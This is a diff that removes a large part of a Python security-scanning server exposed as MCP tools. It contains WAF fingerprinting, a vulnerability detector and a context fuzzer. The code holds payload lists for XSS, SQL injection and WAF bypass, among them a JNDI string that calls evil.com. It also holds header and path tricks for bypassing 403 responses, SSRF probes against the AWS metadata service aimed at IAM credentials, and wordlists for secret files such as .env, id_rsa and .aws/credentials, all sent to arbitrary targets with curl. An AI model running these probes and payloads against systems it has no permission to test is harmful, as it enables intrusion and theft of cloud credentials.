-            if ":" in line:
-                k, _, v = line.partition(":")
-                response_headers[k.strip()] = v.strip()
-
-    output = {
-        "status": "success", "url": url, "method": method,
-        "response_headers": response_headers,
-        "body": body[:5000],
-        "body_length": len(body),
-        "return_code": result["return_code"]
-    }
-
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("run_curl_advanced", target, output)
-    log_tool_execution("run_curl_advanced", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def waf_fingerprint(
-    target: str,
-    timeout: int = 60
-) -> str:
-    """
-    WAF (Web Application Firewall) detection and fingerprinting. Identifies Cloudflare, AWS WAF, Akamai, ModSecurity, etc.
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("waf_fingerprint", target, 5)
-    url = target if target.startswith("http") else f"https://{target}"
-    inputs = {"target": url}
-
-    progress.update("Baseline request")
-    baseline_cmd = ["curl", "-sI", "-k", "--max-time", "10", url]
-    baseline = run_command_advanced(baseline_cmd, timeout=15, trace=trace)
-    baseline_headers = baseline["stdout"].lower()
-
-    waf_signatures = {
-        "Cloudflare": ["cf-ray", "cf-cache-status", "__cfduid", "cloudflare"],
-        "AWS WAF": ["x-amzn-requestid", "x-amz-cf-id", "awselb"],
-        "Akamai": ["akamai", "x-akamai", "akamai-ghost"],
-        "Imperva/Incapsula": ["incap_ses", "incapsula", "x-iinfo", "visid_incap"],
-        "F5 BIG-IP": ["bigipserver", "f5", "x-wa-info"],
-        "ModSecurity": ["mod_security", "modsecurity", "nyob"],
-        "Sucuri": ["sucuri", "x-sucuri-id", "x-sucuri-cache"],
-        "Barracuda": ["barra_counter_session", "barracuda"],
-        "Fortinet/FortiWeb": ["fortigate", "fortiweb", "fortiwafd"],
-        "DDoS-Guard": ["ddos-guard"],
-        "StackPath": ["stackpath"],
-        "Varnish": ["x-varnish", "via: varnish"],
-        "Nginx": ["nginx"],
-        "Apache": ["apache"]
-    }
-
-    detected_wafs = []
-    for waf, sigs in waf_signatures.items():
-        for sig in sigs:
-            if sig.lower() in baseline_headers:
-                detected_wafs.append({"name": waf, "indicator": sig, "source": "headers"})
-                break
-
-    progress.update("Trigger WAF with malicious payload")
-    trigger_payloads = [
-        "<script>alert('XSS')</script>",
-        "' OR 1=1 --",
-        "../../../etc/passwd",
-        "${jndi:ldap://evil.com/a}",
-        "{{7*7}}"
-    ]
-    trigger_results = []
-    for payload in trigger_payloads:
-        encoded = urllib.parse.quote(payload)
-        trigger_url = f"{url}?test={encoded}"
-        trigger_cmd = ["curl", "-sk", "--max-time", "10", "-o", "/dev/null",
-                      "-w", "%{http_code}", trigger_url]
-        r = run_command_advanced(trigger_cmd, timeout=15, trace=trace)
-        status = int(r["stdout"]) if r["stdout"].isdigit() else 0
-        blocked = status in [403, 406, 429, 503]
-        trigger_results.append({"payload": payload, "status": status, "blocked": blocked})
-        if blocked and not any(w["source"] == "blocking" for w in detected_wafs):
-            detected_wafs.append({"name": "Unknown WAF", "indicator": f"Blocked payload (HTTP {status})",
-                                "source": "blocking"})
-
-    progress.update("wafw00f check")
-    wafw00f_cmd = ["wafw00f", url]
-    wafw00f_result = run_command_advanced(wafw00f_cmd, timeout=30, trace=trace)
-
-    progress.update("Analysis")
-    output = {
-        "status": "success", "target": url,
-        "waf_detected": bool(detected_wafs),
-        "wafs": detected_wafs,
-        "trigger_tests": trigger_results,
-        "wafw00f_output": wafw00f_result["stdout"][:1500],
-        "bypass_recommendations": [
-            "Try different encoding (URL, double-URL, Unicode)",
-            "Use HTTP parameter pollution",
-            "Try alternate HTTP methods",
-            "Modify Content-Type header",
-            "Use chunked transfer encoding",
-            "Insert null bytes or comments in payloads"
-        ] if detected_wafs else [],
-        "severity": "info"
-    }
-
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("waf_fingerprint", target, output)
-    log_tool_execution("waf_fingerprint", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-# ============================================================================
-# SERVER SECURITY AUDIT (SELF-AUDIT)
-# ============================================================================
-
-@mcp.tool()
-@resolve_references
-async def server_security_audit() -> str:
-    """
-    Security audit of this MCP server itself. Checks file permissions, input validation, dependency vulnerabilities,
-    configuration security, and provides hardening recommendations.
-    """
-    target = "mcp_server_self"
-    trace, progress, exec_dir = _init_tool_context("server_security_audit", target, 7)
-    inputs = {"audit_type": "self"}
-
-    findings = []
-
-    progress.update("Checking file permissions")
-    server_file = os.path.abspath(__file__)
-    stat = os.stat(server_file)
-    perms = oct(stat.st_mode)[-3:]
-    if perms != "644" and perms != "600":
-        findings.append({"category": "file_permissions", "severity": "MEDIUM",
-                        "detail": f"Server file permissions: {perms} (recommended: 644)",
-                        "file": server_file})
-
-    for d in [SESSIONS_DIR, CVE_CACHE_DIR, CHAIN_DIR]:
-        if os.path.exists(d):
-            d_perms = oct(os.stat(d).st_mode)[-3:]
-            if d_perms not in ["755", "700"]:
-                findings.append({"category": "directory_permissions", "severity": "LOW",
-                                "detail": f"Directory {d} permissions: {d_perms}"})
-
-    progress.update("Checking input validation")
-    validation_checks = {
-        "InputValidator class": "InputValidator" in open(server_file).read(),
-        "sanitize_target": "sanitize_target" in open(server_file).read(),
-        "validate_command_args": "validate_command_args" in open(server_file).read(),
-        "validate_file_path": "validate_file_path" in open(server_file).read()
-    }
-    for check, present in validation_checks.items():
-        if not present:
-            findings.append({"category": "input_validation", "severity": "HIGH",
-                            "detail": f"Missing: {check}"})
-
-    progress.update("Checking for hardcoded secrets")
-    with open(server_file) as f:
-        content = f.read()
-    secret_patterns = [
-        (r'(?:password|secret|key|token)\s*=\s*["\'][^"\']{8,}["\']', "Potential hardcoded secret"),
-        (r'(?:api[_-]?key)\s*[:=]\s*["\'][^"\']+["\']', "Potential API key"),
-    ]
-    for pattern, desc in secret_patterns:
-        matches = re.findall(pattern, content, re.IGNORECASE)
-        if matches:
-            findings.append({"category": "hardcoded_secrets", "severity": "HIGH",
-                            "detail": desc, "count": len(matches)})
-
-    progress.update("Checking dependency security")
-    pip_audit = run_command_advanced(["pip", "list", "--outdated", "--format=json"], timeout=30, trace=trace)
-    try:
-        outdated = json.loads(pip_audit["stdout"])
-        if outdated:
-            findings.append({"category": "outdated_dependencies", "severity": "LOW",
-                            "detail": f"{len(outdated)} outdated packages",
-                            "packages": [f"{p['name']}:{p['version']}->{p['latest_version']}" for p in outdated[:10]]})
-    except Exception:
-        pass
-
-    progress.update("Checking logging security")
-    if "trace.jsonl" in content:
-        findings.append({"category": "logging", "severity": "info",
-                        "detail": "Forensic JSONL trace logging is enabled"})
-    if SESSIONS_DIR and os.path.exists(SESSIONS_DIR):
-        session_count = len(os.listdir(SESSIONS_DIR))
-        if session_count > 100:
-            findings.append({"category": "log_retention", "severity": "LOW",
-                            "detail": f"{session_count} sessions stored - consider rotation"})
-
-    progress.update("Architecture security score")
-    security_features = {
-        "InputValidator": "InputValidator" in content,
-        "TraceLogger": "TraceLogger" in content,
-        "SessionManager": "SessionManager" in content,
-        "ToolChainEngine": "ToolChainEngine" in content,
-        "CVECartographer": "CVECartographer" in content,
-        "hierarchical_logging": "sessions/" in content,
-        "progress_reporting": "ProgressReporter" in content,
-        "command_sanitization": "shlex" in content,
-        "timeout_enforcement": "timeout" in content,
-        "error_handling": "try:" in content and "except" in content
-    }
-    score = sum(1 for v in security_features.values() if v)
-    total = len(security_features)
-
-    output = {
-        "status": "success",
-        "findings": findings,
-        "finding_count": len(findings),
-        "security_features": security_features,
-        "security_score": f"{score}/{total}",
-        "grade": "A" if score >= total * 0.9 else "B" if score >= total * 0.7 else "C",
-        "recommendations": [
-            "Rotate session logs after 30 days",
-            "Add rate limiting per client",
-            "Implement tool execution quotas",
-            "Add RBAC (Role-Based Access Control) for sensitive tools",
-            "Enable TLS for MCP transport",
-            "Add integrity checks for tool chain data"
-        ],
-        "severity": "HIGH" if any(f["severity"] == "HIGH" for f in findings) else "info"
-    }
-
-    progress.update("Complete")
-    log_tool_execution("server_security_audit", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-
-# ============================================================================
-# ENHANCED MODULES — DEEP VULNERABILITY DETECTION
-# ============================================================================
-
-# --- Enhanced Payload Collections (AWS, Golang, WAF bypass, Cloud) ---
-
-class AdvancedPayloads:
-    """Advanced payload collections for deep detection per user analysis requirements."""
-    
-    @staticmethod
-    def aws_cloud_payloads() -> Dict[str, List[str]]:
-        """AWS-specific payloads for cloud infrastructure testing."""
-        return {
-            "s3_buckets": [
-                "s3://{target}-backup", "s3://{target}-prod", "s3://{target}-dev",
-                "s3://{target}-staging", "s3://{target}-assets", "s3://{target}-logs",
-                "s3://{target}-data", "s3://{target}-uploads", "s3://{target}-static",
-                "s3://backup-{target}", "s3://prod-{target}", "s3://dev-{target}",
-            ],
-            "metadata_endpoints": [
-                "http://169.254.169.254/latest/meta-data/",
-                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-                "http://169.254.169.254/latest/user-data",
-                "http://169.254.169.254/latest/dynamic/instance-identity/document",
-                "http://169.254.170.2/v2/credentials",  # ECS task role
-                "http://fd00:ec2::254/latest/meta-data/",  # IPv6
-            ],
-            "aws_endpoints_to_fuzz": [
-                "/aws", "/s3", "/dynamodb", "/lambda", "/cloudformation",
-                "/cloudtrail", "/kms", "/iam", "/ec2", "/rds",
-                "/.aws/credentials", "/.aws/config",
-            ],
-            "cloudtrail_exposure": [
-                "/logs/cloudtrail/", "/var/log/cloudtrail/",
-                "/cloudtrail-logs/", "/audit-logs/",
-            ],
-        }
-    
-    @staticmethod
-    def golang_specific_payloads() -> Dict[str, List[str]]:
-        """Golang application specific payloads."""
-        return {
-            "debug_endpoints": [
-                "/debug/pprof/", "/debug/pprof/heap", "/debug/pprof/goroutine",
-                "/debug/pprof/threadcreate", "/debug/pprof/block", "/debug/pprof/mutex",
-                "/debug/pprof/profile", "/debug/pprof/trace",
-                "/debug/vars", "/debug/requests", "/debug/events",
-                "/metrics", "/healthz", "/readyz", "/livez",
-            ],
-            "framework_paths": [
-                "/routes", "/handlers", "/models", "/controllers",
-                "/api/internal", "/internal/", "/private/",
-            ],
-            "file_extensions": [".go", ".mod", ".sum", ".toml"],
-            "ssti_golang": [
-                "{{.}}", "{{len .}}", "{{printf \"%s\" .}}",
-                "{{range .}}{{.}}{{end}}", '{{define "T"}}{{end}}',
-            ],
-        }
-    
-    @staticmethod
-    def waf_bypass_payloads() -> Dict[str, List[str]]:
-        """WAF bypass techniques for common WAFs."""
-        return {
-            "case_variation": [
-                "<ScRiPt>alert(1)</ScRiPt>", "<SCRIPT>alert(1)</SCRIPT>",
-                "<scRIPT>alert(1)</scRIPT>",
-            ],
-            "encoding_bypass": [
-                "%3Cscript%3Ealert(1)%3C/script%3E",
-                "%253Cscript%253Ealert(1)%253C%252Fscript%253E",  # double encode
-                "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",  # unicode
-            ],
-            "null_byte_bypass": [
-                "<scri%00pt>alert(1)</scri%00pt>",
-                "admin%00.php", "/etc/passwd%00.jpg",
-            ],
-            "header_bypass_403": [
-                "X-Original-URL: /admin",
-                "X-Rewrite-URL: /admin",
-                "X-Forwarded-For: 127.0.0.1",
-                "X-Forwarded-Host: localhost",
-                "X-Custom-IP-Authorization: 127.0.0.1",
-                "X-Real-IP: 127.0.0.1",
-                "X-Remote-IP: 127.0.0.1",
-                "X-Client-IP: 127.0.0.1",
-                "X-Host: 127.0.0.1",
-                "X-Originating-IP: 127.0.0.1",
-                "True-Client-IP: 127.0.0.1",
-            ],
-            "path_bypass_403": [
-                "/admin", "/ADMIN", "/Admin", "/aDmIn",
-                "/%61dmin", "/%2Fadmin", "/%252Fadmin",
-                "/admin%00", "/admin%20", "/admin%09",
-                "/admin/.", "/admin/./", "/./admin/",
-                "/admin..;/", "//admin", "/admin//",
-                "/admin%c0%af", "/admin;/",
-            ],
-            "method_bypass": ["TRACE", "OPTIONS", "CONNECT", "PATCH", "PROPFIND"],
-            "sqli_waf_bypass": [
-                "/*!50000UNION*/+/*!50000SELECT*/+1,2,3",
-                "UNION%0aSELECT%0a1,2,3",
-                "uNiOn+sElEcT+1,2,3",
-                "' AND 1=1#", "' AND 1=1-- -",
-                "'+UNION+ALL+SELECT+NULL,NULL,NULL--+-",
-            ],
-        }
-    
-    @staticmethod
-    def config_files_wordlist() -> List[str]:
-        """Sensitive configuration files to discover."""
-        return [
-            ".env", ".env.local", ".env.production", ".env.staging", ".env.backup",
-            "config.php", "config.yml", "config.yaml", "config.json", "config.xml",
-            "settings.py", "settings.json", "settings.yml",
-            "secrets.yaml", "secrets.json", "secrets.yml",
-            "credentials.json", "credentials.yml",
-            ".git/config", ".git/HEAD", ".gitignore",
-            ".svn/entries", ".hg/hgrc",
-            "web.config", "appsettings.json", "appsettings.Development.json",
-            "docker-compose.yml", "docker-compose.override.yml",
-            "Dockerfile", ".dockerignore",
-            "package.json", "package-lock.json", "yarn.lock",
-            "composer.json", "composer.lock",
-            "Gemfile", "Gemfile.lock",
-            "requirements.txt", "Pipfile", "Pipfile.lock",
-            "go.mod", "go.sum",
-            ".htaccess", ".htpasswd",
-            "robots.txt", "sitemap.xml",
-            "crossdomain.xml", "clientaccesspolicy.xml",
-            "phpinfo.php", "info.php", "test.php",
-            "backup.sql", "dump.sql", "database.sql",
-            "id_rsa", "id_rsa.pub", ".ssh/authorized_keys",
-            "wp-config.php", "wp-config.php.bak",
-            "/actuator", "/actuator/env", "/actuator/health",
-            "/swagger.json", "/swagger-ui.html", "/api-docs",
-            "/openapi.json", "/v2/api-docs", "/v3/api-docs",
-        ]
-    
-    @staticmethod
-    def sensitive_dirs_wordlist() -> List[str]:
-        """Critical directories to enumerate."""
-        return [
-            ".git", ".svn", ".hg", ".bzr",
-            "node_modules", "vendor", "src", "lib",
-            "backup", "backups", "bak", "old", "temp", "tmp",
-            "admin", "administrator", "panel", "dashboard", "cp",
-            "api", "api/v1", "api/v2", "api/v3", "api/internal",
-            "graphql", "graphiql",
-            "debug", "test", "testing", "staging", "dev",
-            "private", "internal", "secret", "hidden",
-            "uploads", "files", "documents", "media", "assets",
-            "cgi-bin", "scripts", "includes",
-            "phpmyadmin", "pma", "adminer", "dbadmin",
-            "wp-admin", "wp-includes", "wp-content",
-            "console", "terminal", "shell",
-        ]
-
-
-@mcp.tool()
-@resolve_references
-async def smart_vulnerability_detector(
-    target: str, 
-    scan_depth: str = "standard",
-    focus_areas: str = "all",
-    timeout: int = 300
-) -> str:
-    """
-    Intelligent vulnerability detector that analyzes HTTP responses for critical patterns.
-    Detects: RCE indicators, Auth bypass, Data leaks, Misconfigurations.
-    Focus areas: all, rce, auth_bypass, data_leak, misconfig, cloud, injection
-    Scan depth: quick, standard, deep
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("smart_vulnerability_detector", target, 10)
-    inputs = {"target": target, "scan_depth": scan_depth, "focus_areas": focus_areas}
-    
-    url = target if target.startswith("http") else f"https://{target}"
-    findings = []
-    
-    # Step 1: Baseline HTTP analysis
-    progress.update("Baseline HTTP analysis", "Probing target")
-    baseline_cmd = ["curl", "-skI", "--max-time", "15", "-L", url]
-    baseline = run_command_advanced(baseline_cmd, timeout=30, trace=trace)
-    headers_raw = baseline["stdout"].lower()
-    
-    # Step 2: Technology fingerprinting from headers
-    progress.update("Technology fingerprinting")
-    tech_indicators = {
-        "golang": ["x-powered-by: go", "server: go", "content-type: application/json"],
-        "aws": ["x-amzn-", "x-amz-", "server: amazons3", "server: awselb", "via: cloudfront"],
-        "nginx": ["server: nginx"],
-        "apache": ["server: apache"],
-        "cloudflare": ["server: cloudflare", "cf-ray"],
-        "express": ["x-powered-by: express"],
-    }
-    detected_stack = []
-    for tech, indicators in tech_indicators.items():
-        if any(ind in headers_raw for ind in indicators):
-            detected_stack.append(tech)
-    
-    # Step 3: Critical endpoint probing
-    progress.update("Critical endpoint probing")
-    critical_paths = [
-        "/.env", "/.git/config", "/debug/pprof/", "/actuator/env",
-        "/swagger.json", "/api-docs", "/.aws/credentials",
-        "/server-status", "/server-info", "/.well-known/security.txt",
-        "/robots.txt", "/sitemap.xml", "/wp-config.php.bak",
-    ]
-    
-    if "golang" in detected_stack:
-        critical_paths.extend(AdvancedPayloads.golang_specific_payloads()["debug_endpoints"])
-    if "aws" in detected_stack:
-        critical_paths.extend(AdvancedPayloads.aws_cloud_payloads()["aws_endpoints_to_fuzz"])
-    
-    exposed_endpoints = []
-    for path in critical_paths[:30]:  # Limit to avoid timeout
-        probe_url = f"{url.rstrip('/')}{path}"
-        probe_cmd = ["curl", "-sk", "--max-time", "8", "-o", "/dev/null", "-w", "%{http_code}", probe_url]
-        probe_result = run_command_advanced(probe_cmd, timeout=12, trace=trace)
-        status_code = probe_result["stdout"].strip()
-        if status_code in ["200", "301", "302", "401", "403", "405"]:
-            exposed_endpoints.append({"path": path, "status": status_code})
-            if status_code == "200":
-                findings.append({
-                    "type": "EXPOSED_ENDPOINT", "severity": "HIGH",
-                    "path": path, "status": status_code,
-                    "detail": f"Endpoint accessible: {path}"
-                })
-    
-    # Step 4: 403 bypass testing
-    progress.update("403 bypass testing")
-    forbidden_paths = [ep for ep in exposed_endpoints if ep["status"] == "403"]
-    bypass_headers = AdvancedPayloads.waf_bypass_payloads()["header_bypass_403"]
-    
-    for forbidden in forbidden_paths[:5]:
-        for header in bypass_headers[:6]:
-            h_name, h_value = header.split(": ", 1)
-            bypass_cmd = ["curl", "-sk", "--max-time", "8", "-o", "/dev/null", "-w", "%{http_code}",
-                         "-H", f"{h_name}: {h_value}", f"{url.rstrip('/')}{forbidden['path']}"]
-            bypass_result = run_command_advanced(bypass_cmd, timeout=12, trace=trace)
-            if bypass_result["stdout"].strip() == "200":
-                findings.append({
-                    "type": "403_BYPASS", "severity": "CRITICAL",
-                    "path": forbidden["path"], "bypass_header": header,
-                    "detail": f"403 bypassed with {h_name} header"
-                })
-                break
-    
-    # Step 5: Information disclosure via error pages
-    progress.update("Information disclosure analysis")
-    error_triggers = [
-        f"{url}/{'A' * 500}", f"{url}/%00", f"{url}/\x00",
-        f"{url}/?debug=true", f"{url}/?test=1&__debug=1",
-    ]
-    for trigger in error_triggers:
-        err_cmd = ["curl", "-sk", "--max-time", "8", trigger]
-        err_result = run_command_advanced(err_cmd, timeout=12, trace=trace)
-        body = err_result["stdout"]
-        # Check for stack traces, file paths, version info
-        leak_patterns = [
-            ("STACK_TRACE", r"(?:at |File |Traceback|goroutine|panic:)"),
-            ("FILE_PATH", r"(?:/usr/|/var/|/home/|/opt/|/app/|/src/)"),
-            ("VERSION_LEAK", r"(?:version|v\d+\.\d+|go\d+\.\d+)"),
-            ("DB_ERROR", r"(?:SQL|mysql|postgres|sqlite|ORM|GORM)"),
-            ("SECRET_LEAK", r"(?:api_key|secret|password|token|aws_)"),
-        ]
-        for leak_type, pattern in leak_patterns:
-            if re.search(pattern, body, re.IGNORECASE):
-                findings.append({
-                    "type": f"INFO_DISCLOSURE_{leak_type}", "severity": "HIGH",
-                    "trigger": trigger[:100],
-                    "detail": f"Information leak detected: {leak_type}"
-                })
-                break
-    
-    # Step 6: SSRF via cloud metadata (if AWS detected)
-    progress.update("Cloud metadata SSRF testing")
-    if "aws" in detected_stack or focus_areas in ["all", "cloud"]:
-        metadata_urls = AdvancedPayloads.aws_cloud_payloads()["metadata_endpoints"]
-        for meta_url in metadata_urls[:4]:
-            # Try common SSRF params
-            for param in ["url", "redirect", "uri", "path", "next", "link", "proxy"]:
-                ssrf_url = f"{url}/?{param}={meta_url}"
-                ssrf_cmd = ["curl", "-sk", "--max-time", "10", ssrf_url]
-                ssrf_result = run_command_advanced(ssrf_cmd, timeout=15, trace=trace)
-                if any(x in ssrf_result["stdout"] for x in ["iam", "instance-id", "ami-id", "security-credentials"]):
-                    findings.append({
-                        "type": "SSRF_CLOUD_METADATA", "severity": "CRITICAL",
-                        "param": param, "payload": meta_url,
-                        "detail": "AWS metadata accessible via SSRF!"
-                    })
-    
-    # Step 7: Security header analysis (deep)
-    progress.update("Deep security header analysis")
-    header_issues = []
-    if "strict-transport-security" not in headers_raw:
-        header_issues.append({"header": "HSTS", "severity": "MEDIUM", "detail": "Missing HSTS header"})
-    if "content-security-policy" not in headers_raw:
-        header_issues.append({"header": "CSP", "severity": "MEDIUM", "detail": "Missing CSP header"})
-    elif "unsafe-inline" in headers_raw or "unsafe-eval" in headers_raw:
-        header_issues.append({"header": "CSP", "severity": "HIGH", "detail": "CSP allows unsafe-inline/eval"})
-    if "x-frame-options" not in headers_raw:
-        header_issues.append({"header": "X-Frame-Options", "severity": "MEDIUM", "detail": "Clickjacking possible"})
-    if "x-content-type-options" not in headers_raw:
-        header_issues.append({"header": "X-Content-Type-Options", "severity": "LOW", "detail": "MIME sniffing possible"})
-    for issue in header_issues:
-        findings.append({"type": "HEADER_SECURITY", **issue})
-    
-    # Step 8: Method enumeration
-    progress.update("HTTP method enumeration")
-    options_cmd = ["curl", "-sk", "--max-time", "10", "-X", "OPTIONS", "-I", url]
-    options_result = run_command_advanced(options_cmd, timeout=15, trace=trace)
-    allowed_methods = []
-    for line in options_result["stdout"].split("\n"):
-        if "allow:" in line.lower():
-            allowed_methods = [m.strip() for m in line.split(":", 1)[1].split(",")]
-    dangerous_methods = [m for m in allowed_methods if m.upper() in ["PUT", "DELETE", "TRACE", "CONNECT"]]
-    if dangerous_methods:
-        findings.append({
-            "type": "DANGEROUS_METHODS", "severity": "HIGH",
-            "methods": dangerous_methods,
-            "detail": f"Dangerous HTTP methods allowed: {dangerous_methods}"
-        })
-    
-    # Step 9: Generate severity summary
-    progress.update("Generating report")
-    severity_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
-    for f in findings:
-        sev = f.get("severity", "INFO")
-        severity_counts[sev] = severity_counts.get(sev, 0) + 1
-    
-    output = {
-        "status": "success",
-        "target": target,
-        "detected_stack": detected_stack,
-        "scan_depth": scan_depth,
-        "total_findings": len(findings),
-        "severity_summary": severity_counts,
-        "critical_findings": [f for f in findings if f.get("severity") == "CRITICAL"],
-        "high_findings": [f for f in findings if f.get("severity") == "HIGH"],
-        "medium_findings": [f for f in findings if f.get("severity") == "MEDIUM"],
-        "exposed_endpoints": exposed_endpoints,
-        "all_findings": findings,
-        "recommendations": _generate_smart_recommendations(findings, detected_stack),
-    }
-    
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("smart_vulnerability_detector", target, output)
-    log_tool_execution("smart_vulnerability_detector", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-def _generate_smart_recommendations(findings: List[Dict], stack: List[str]) -> List[str]:
-    """Generate actionable recommendations based on findings."""
-    recs = []
-    finding_types = [f.get("type", "") for f in findings]
-    
-    if any("SSRF" in t for t in finding_types):
-        recs.append("CRITICAL: SSRF detected - investigate cloud metadata access, check IAM roles")
-    if any("403_BYPASS" in t for t in finding_types):
-        recs.append("CRITICAL: 403 bypass found - access control misconfiguration confirmed")
-    if any("EXPOSED_ENDPOINT" in t for t in finding_types):
-        recs.append("HIGH: Sensitive endpoints exposed - review access controls immediately")
-    if any("INFO_DISCLOSURE" in t for t in finding_types):
-        recs.append("HIGH: Information leaking via error pages - implement custom error handlers")
-    if "golang" in stack:
-        recs.append("STACK: Golang detected - test /debug/pprof, check template injection {{.}}")
-    if "aws" in stack:
-        recs.append("STACK: AWS detected - enumerate S3 buckets, test SSRF to metadata service")
-    if not recs:
-        recs.append("No critical findings in quick scan - recommend deep scan with scan_depth='deep'")
-    return recs
-
-
-@mcp.tool()
-@resolve_references
-async def context_fuzzer(
-    target: str,
-    mode: str = "smart",
-    wordlist_type: str = "auto",
-    follow_redirects: bool = True,
-    timeout: int = 300
-) -> str:
-    """
-    Context-aware fuzzer that analyzes 403/422/401 responses to discover hidden endpoints.
-    Modes: smart (auto-detect stack and adapt), aggressive (all techniques), stealth (slow + evasive)
-    Wordlist types: auto, golang, aws, api, config, full
-    Uses responses to intelligently adapt fuzzing strategy.
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("context_fuzzer", target, 8)
-    inputs = {"target": target, "mode": mode, "wordlist_type": wordlist_type}
-    
-    url = target if target.startswith("http") else f"https://{target}"
-    discovered = []
-    
-    # Step 1: Baseline + stack detection
-    progress.update("Baseline analysis", "Detecting target stack")
-    baseline_cmd = ["curl", "-skI", "--max-time", "15", "-L", url]
-    baseline = run_command_advanced(baseline_cmd, timeout=20, trace=trace)
-    
-    # Auto-detect wordlist based on stack
-    detected_tech = []
-    headers_lower = baseline["stdout"].lower()
-    if any(x in headers_lower for x in ["go", "golang", "gin", "echo", "fiber"]):
-        detected_tech.append("golang")
-    if any(x in headers_lower for x in ["x-amzn", "x-amz", "cloudfront", "awselb"]):
-        detected_tech.append("aws")
-    if any(x in headers_lower for x in ["express", "node", "x-powered-by: express"]):
-        detected_tech.append("node")
-    if any(x in headers_lower for x in ["php", "laravel", "symfony"]):
-        detected_tech.append("php")
-    
-    # Step 2: Build smart wordlist
-    progress.update("Building adaptive wordlist")
-    wordlist = []
-    
-    # Always include sensitive files
-    wordlist.extend(AdvancedPayloads.config_files_wordlist())
-    wordlist.extend(AdvancedPayloads.sensitive_dirs_wordlist())
-    
-    # Stack-specific additions
-    if "golang" in detected_tech or wordlist_type in ["golang", "full"]:
-        wordlist.extend(AdvancedPayloads.golang_specific_payloads()["debug_endpoints"])
-        wordlist.extend(AdvancedPayloads.golang_specific_payloads()["framework_paths"])
-    if "aws" in detected_tech or wordlist_type in ["aws", "full"]:
-        wordlist.extend(AdvancedPayloads.aws_cloud_payloads()["aws_endpoints_to_fuzz"])
-    
-    # API-specific paths
-    api_paths = [
-        "/api", "/api/v1", "/api/v2", "/api/v3", "/api/internal",
-        "/graphql", "/graphiql", "/playground",
-        "/rest", "/rpc", "/ws", "/websocket",
-        "/health", "/status", "/info", "/version",
-    ]
-    wordlist.extend(api_paths)
-    
-    # Deduplicate
-    wordlist = list(dict.fromkeys(wordlist))
-    
-    # Step 3: Fuzz with response analysis
-    progress.update("Fuzzing endpoints", f"{len(wordlist)} paths to test")
-    response_map = {"200": [], "301": [], "302": [], "401": [], "403": [], "405": [], "422": [], "500": []}
-    
-    for path in wordlist[:100]:  # Limit to prevent timeout
-        fuzz_url = f"{url.rstrip('/')}/{path.lstrip('/')}"
-        fuzz_cmd = ["curl", "-sk", "--max-time", "6", "-o", "/dev/null",
-                   "-w", "%{http_code}|%{size_download}", fuzz_url]
-        fuzz_result = run_command_advanced(fuzz_cmd, timeout=10, trace=trace)
-        parts = fuzz_result["stdout"].strip().split("|")
-        if len(parts) == 2:
-            code, size = parts[0], parts[1]
-            if code in response_map:
-                response_map[code].append({"path": path, "size": size})
-            if code in ["200", "301", "302"]:
-                discovered.append({"path": path, "status": code, "size": size, "type": "accessible"})
-            elif code == "401":
-                discovered.append({"path": path, "status": code, "size": size, "type": "auth_required"})
-            elif code == "403":
-                discovered.append({"path": path, "status": code, "size": size, "type": "forbidden"})
-            elif code == "405":
-                discovered.append({"path": path, "status": code, "size": size, "type": "method_not_allowed"})
-            elif code == "422":
-                discovered.append({"path": path, "status": code, "size": size, "type": "param_required"})
-    
-    # Step 4: 403 bypass attempts
-    progress.update("403 bypass testing")
-    bypass_results = []
-    forbidden_endpoints = response_map.get("403", [])[:5]
-    bypass_techniques = AdvancedPayloads.waf_bypass_payloads()["path_bypass_403"]
-    
-    for endpoint in forbidden_endpoints:
-        original_path = endpoint["path"]
-        for bypass_path in bypass_techniques[:8]:
-            # Replace /admin with the bypass variant
-            test_path = bypass_path.replace("/admin", f"/{original_path.strip('/')}")
-            test_url = f"{url.rstrip('/')}{test_path}"
-            bypass_cmd = ["curl", "-sk", "--max-time", "6", "-o", "/dev/null", "-w", "%{http_code}", test_url]
-            bypass_result = run_command_advanced(bypass_cmd, timeout=10, trace=trace)
-            if bypass_result["stdout"].strip() in ["200", "301", "302"]:
-                bypass_results.append({
-                    "original_path": original_path,
-                    "bypass_path": test_path,
-                    "status": bypass_result["stdout"].strip(),
-                    "severity": "CRITICAL"
-                })
-                break
-    
-    # Step 5: Header-based 403 bypass
-    progress.update("Header bypass testing")
-    header_bypasses = AdvancedPayloads.waf_bypass_payloads()["header_bypass_403"]
-    for endpoint in forbidden_endpoints[:3]:
-        for header in header_bypasses[:5]:
-            h_name, h_val = header.split(": ", 1)
-            hdr_url = f"{url.rstrip('/')}/{endpoint['path'].lstrip('/')}"
-            hdr_cmd = ["curl", "-sk", "--max-time", "6", "-o", "/dev/null", "-w", "%{http_code}",
-                      "-H", f"{h_name}: {h_val}", hdr_url]
-            hdr_result = run_command_advanced(hdr_cmd, timeout=10, trace=trace)
-            if hdr_result["stdout"].strip() == "200":
-                bypass_results.append({
-                    "original_path": endpoint["path"],
-                    "bypass_header": header,
-                    "status": "200",
-                    "severity": "CRITICAL"
-                })
-                break
-    
-    # Step 6: Method probing on 405 endpoints
-    progress.update("Method probing on 405 endpoints")
-    method_discoveries = []
-    method_endpoints = response_map.get("405", [])[:5]
-    http_methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]
-    
-    for endpoint in method_endpoints:
-        ep_url = f"{url.rstrip('/')}/{endpoint['path'].lstrip('/')}"
-        for method in http_methods:
-            method_cmd = ["curl", "-sk", "--max-time", "6", "-o", "/dev/null",
-                         "-w", "%{http_code}", "-X", method, ep_url]
-            method_result = run_command_advanced(method_cmd, timeout=10, trace=trace)
-            code = method_result["stdout"].strip()
-            if code not in ["405", "404", "000"]:
-                method_discoveries.append({
-                    "path": endpoint["path"], "method": method, "status": code
-                })
